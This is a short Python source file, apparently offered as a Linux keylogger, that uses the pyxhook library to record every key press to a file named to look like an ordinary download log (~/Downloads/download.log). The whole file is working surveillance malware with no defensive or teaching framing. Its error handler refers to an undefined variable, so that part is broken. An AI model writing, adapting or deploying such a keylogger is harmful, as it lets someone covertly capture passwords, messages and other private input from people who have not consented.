#################################
# Keylogger to be used in Linux #
#################################

import os
import pyxhook

log = os.environ.get(
    'pylogger_file',
    os.path.expanduser('~/Downloads/download.log')
)

def OnKeyPress(event):
    with open(log, 'a') as f:
        if(event.Key == "Return" or event.Key == "Tab"):
            f.write('{}\n'.format(event.Key))
        else:
            f.write('{} - '.format(event.Key))


new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress

new_hook.HookKeyboard()
try:
    new_hook.start()
except KeyboardInterrupt:

    pass
except Exception as ex:
    msg = 'Error while catching events:\n  {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))
